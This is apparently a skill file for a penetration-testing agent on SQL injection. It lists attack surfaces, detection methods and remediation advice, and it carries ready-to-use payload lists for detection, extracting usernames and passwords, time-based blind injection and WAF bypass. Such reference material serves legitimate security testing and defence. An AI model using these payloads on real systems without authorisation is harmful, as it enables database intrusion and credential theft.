---
name: sqli
description: SQL Injection detection and exploitation techniques
---

# SQL Injection (SQLi)

## Attack Surface

- URL query parameters and path segments
- POST body fields (forms, JSON, XML)
- HTTP headers: Cookie, X-Forwarded-For, Referer, User-Agent
- Order-by and sort parameters (often unsanitized)
- Search and filter functionality
- Batch/bulk API endpoints accepting arrays

## Detection Techniques

- Inject single quote `'` and observe error messages or behavior changes
- Boolean-based: compare `AND 1=1` vs `AND 1=2` response differences
- Time-based: `'; WAITFOR DELAY '0:0:5'--` or `' AND SLEEP(5)--`
- UNION-based: determine column count with `ORDER BY N` then `UNION SELECT`
- Error-based: force verbose errors with `EXTRACTVALUE()`, `UPDATEXML()`
- Out-of-band: DNS exfiltration via `LOAD_FILE()` or `UTL_HTTP`

## Common Payloads

### Detection
```
'
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
1' ORDER BY 1--
1' UNION SELECT NULL--
' AND 1=CONVERT(int,(SELECT @@version))--
```

### Extraction
```
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Time-Based Blind
```
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
' AND (SELECT * FROM (SELECT SLEEP(5))a)--
1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
```

### WAF Bypass
```
/*!50000UNION*/ /*!50000SELECT*/
' UnIoN SeLeCt 1,2,3--
' AND 1=(SELECT 1 FROM dual WHERE 1=1)--
```

## Remediation

- Use parameterized queries / prepared statements exclusively
- Apply allowlist validation on sort columns and table names
- Enforce least-privilege database accounts (no DROP, FILE, GRANT)
- Disable verbose database error messages in production
- Deploy WAF rules as defense-in-depth (not primary defense)
- Audit ORM usage for raw query injection points

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLi Cheat Sheet (pentestmonkey)](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
